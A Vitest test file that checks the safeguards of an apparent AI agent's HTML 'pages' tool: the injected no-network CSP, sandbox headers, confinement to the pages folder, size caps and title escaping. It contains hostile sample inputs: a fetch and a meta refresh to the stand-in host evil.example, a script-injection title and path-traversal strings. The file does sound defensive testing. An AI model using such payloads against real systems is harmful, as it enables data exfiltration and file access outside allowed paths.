import { existsSync, mkdtempSync, readdirSync, readFileSync, realpathSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { describe, expect, test } from 'vitest'
import { applyEdits, buildPage, cleanTitle, isPagePath, MAX_PAGE_BYTES, PAGE_CSP, pageFile, pageParts, pageTools, servePage, slugify } from '../../src/main/agent/tools/pages'

const ctx = { state: { roots: [] } } as never
const fresh = (): string => join(mkdtempSync(join(tmpdir(), 'ws-')), 'pages')

describe('page CSP', () => {
  test('is injected before any page content', () => {
    const doc = buildPage('Report', '<script>fetch("https://evil.example")</script><h1>Hi</h1>')
    const meta = doc.indexOf('http-equiv="Content-Security-Policy"')
    expect(meta).toBeGreaterThan(0)
    expect(meta).toBeLessThan(doc.indexOf('fetch('))
    expect(doc).toContain(`content="${PAGE_CSP}"`)
    // Full documents from the model still get our head first.
    const full = buildPage('X', '<!doctype html><html><head><script>1</script></head><body>b</body></html>')
    expect(full.match(/<!doctype/gi)).toHaveLength(1)
    expect(full.indexOf('Content-Security-Policy')).toBeLessThan(full.indexOf('<script>1</script>'))
  })

  test('allows no network: every source is none, inline, data: or blob:', () => {
    const directives = PAGE_CSP.split(';').map((d) => d.trim().split(/\s+/))
    const names = directives.map((d) => d[0])
    expect(names).toContain('default-src')
    expect(directives.find((d) => d[0] === 'default-src')!.slice(1)).toEqual(["'none'"])
    expect(directives.find((d) => d[0] === 'connect-src')!.slice(1)).toEqual(["'none'"])
    for (const [, ...sources] of directives) {
      for (const src of sources) expect(["'none'", "'unsafe-inline'", 'data:', 'blob:']).toContain(src)
    }
    expect(PAGE_CSP).not.toMatch(/https?:|wss?:|\*|'self'|'unsafe-eval'/)
    expect(names).toEqual(expect.arrayContaining(['form-action', 'base-uri', 'frame-src', 'object-src', 'worker-src']))
  })

  test('strips meta refresh redirects', () => {
    const doc = buildPage('X', '<meta http-equiv="refresh" content="0;url=https://evil.example/?d=1"><p>x</p>')
    expect(doc).not.toMatch(/refresh/i)
  })

  test('served pages carry the CSP and sandbox as headers; other files fall through', () => {
    const dir = fresh()
    const p = pageFile(dir, 'a.html')
    writeFileSync(p, '<script>fetch("https://x")</script>')
    const r = servePage(dir, p)!
    expect(r.headers.get('Content-Security-Policy')).toBe(`${PAGE_CSP}; sandbox allow-scripts`)
    expect(r.headers.get('Content-Type')).toMatch(/text\/html/)
    writeFileSync(join(dir, 'notes.txt'), 'x')
    expect(servePage(dir, join(dir, 'notes.txt'))).toBeNull()
    expect(servePage(dir, '/etc/hosts')).toBeNull()
  })
})

describe('page paths are confined to the pages folder', () => {
  test('rejects escapes, folders, hidden names and outside absolute paths', () => {
    const dir = fresh()
    expect(() => pageFile(dir, '../x.html')).toThrow(/folder/)
    expect(() => pageFile(dir, 'sub/x.html')).toThrow(/folder/)
    expect(() => pageFile(dir, '/etc/x.html')).toThrow(/outside/)
    expect(() => pageFile(dir, '~/x.html')).toThrow(/outside/)
    expect(() => pageFile(dir, '.hidden.html')).toThrow(/valid/)
    expect(() => pageFile(dir, '..')).toThrow()
    expect(() => pageFile(dir, '')).toThrow()
    const root = realpathSync(dir)
    expect(pageFile(dir, 'q3')).toBe(join(root, 'q3.html'))
    expect(pageFile(dir, 'pages/q3.html')).toBe(join(root, 'q3.html'))
    expect(pageFile(dir, join(root, 'q3.html'))).toBe(join(root, 'q3.html'))
  })

  test('rejects symlinks and only treats direct children as pages', () => {
    const dir = fresh()
    const outside = join(mkdtempSync(join(tmpdir(), 'out-')), 'secret.html')
    writeFileSync(outside, 'secret')
    pageFile(dir, 'a.html')
    symlinkSync(outside, join(dir, 'link.html'))
    expect(() => pageFile(dir, 'link.html')).toThrow(/link/)
    expect(isPagePath(dir, join(dir, 'link.html'))).toBe(false)
    expect(isPagePath(dir, outside)).toBe(false)
    expect(servePage(dir, join(dir, 'link.html'))).toBeNull()
  })

  test('create_page refuses a path outside the folder and never writes there', async () => {
    const dir = fresh()
    const [create] = pageTools(() => dir)
    const target = join(mkdtempSync(join(tmpdir(), 'out-')), 'evil.html')
    await expect(create.run({ title: 'x', html: '<p>x</p>', path: target }, ctx)).rejects.toThrow(/outside/)
    await expect(create.run({ title: 'x', html: '<p>x</p>', path: '../../evil.html' }, ctx)).rejects.toThrow()
    expect(existsSync(target)).toBe(false)
  })
})

describe('size cap', () => {
  test('pages over 2 MB are refused on create and update', async () => {
    const dir = fresh()
    const [create, update] = pageTools(() => dir)
    const big = 'x'.repeat(MAX_PAGE_BYTES + 1)
    await expect(create.run({ title: 'Big', html: big }, ctx)).rejects.toThrow(/at most/)
    const r = await create.run({ title: 'Small', html: '<p>x</p>' }, ctx)
    await expect(update.run({ path: r.path!, html: big }, ctx)).rejects.toThrow(/at most/)
  })
})

describe('titles', () => {
  test('are one clean line and escaped in the page', () => {
    expect(cleanTitle('  Q3\n\tSales‮  ')).toBe('Q3 Sales')
    expect(cleanTitle('')).toBe('Untitled page')
    expect(cleanTitle(undefined)).toBe('Untitled page')
    expect(cleanTitle('a'.repeat(500)).length).toBeLessThanOrEqual(120)
    const doc = buildPage('</title><script>alert(1)</script>', '<p>x</p>')
    expect(doc).toContain('<title>&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;</title>')
  })
  test('become safe file names', () => {
    expect(slugify('Q3 Sales — Café Report!')).toBe('q3-sales-cafe-report')
    expect(slugify('../../etc/passwd')).toBe('etc-passwd')
    expect(slugify('日本')).toBe('page')
    expect(slugify('x'.repeat(200)).length).toBeLessThanOrEqual(60)
  })
})

describe('create_page and update_page', () => {
  test('creates unique files, edits content and keeps the previous version', async () => {
    const dir = fresh()
    const [create, update] = pageTools(() => dir)
    const a = await create.run({ title: 'Sales Dashboard', html: '<h1>Old</h1>' }, ctx)
    const b = await create.run({ title: 'Sales Dashboard', html: '<h1>Two</h1>' }, ctx)
    expect(a.path).toMatch(/sales-dashboard\.html$/)
    expect(b.path).toMatch(/sales-dashboard-2\.html$/)
    await expect(create.run({ title: 'x', html: 'x', path: 'sales-dashboard.html' }, ctx)).rejects.toThrow(/exists/)

    await update.run({ path: a.path!, edits: [{ find: '<h1>Old</h1>', replace: '<h1>New</h1>' }] }, ctx)
    const file = readFileSync(a.path!, 'utf8')
    expect(pageParts(file)).toEqual({ title: 'Sales Dashboard', html: '<h1>New</h1>' })
    expect(file).toContain('Content-Security-Policy')
    expect(file.match(/id="sb-lib"/g)).toHaveLength(1)
    expect(readdirSync(join(dir, '.versions'))).toHaveLength(1)
    await expect(update.run({ path: a.path!, edits: [{ find: 'nope', replace: 'x' }] }, ctx)).rejects.toThrow(/wasn't in the page/)
    await expect(update.run({ path: 'missing.html', html: 'x' }, ctx)).rejects.toThrow(/No page/)
  })

  test('applyEdits needs a unique match unless all is set', () => {
    expect(() => applyEdits('a a', [{ find: 'a', replace: 'b' }])).toThrow(/2 times/)
    expect(applyEdits('a a', [{ find: 'a', replace: 'b', all: true }])).toBe('b b')
    expect(applyEdits('x$1', [{ find: 'x', replace: '$&$&' }])).toBe('$&$&$1')
  })
})
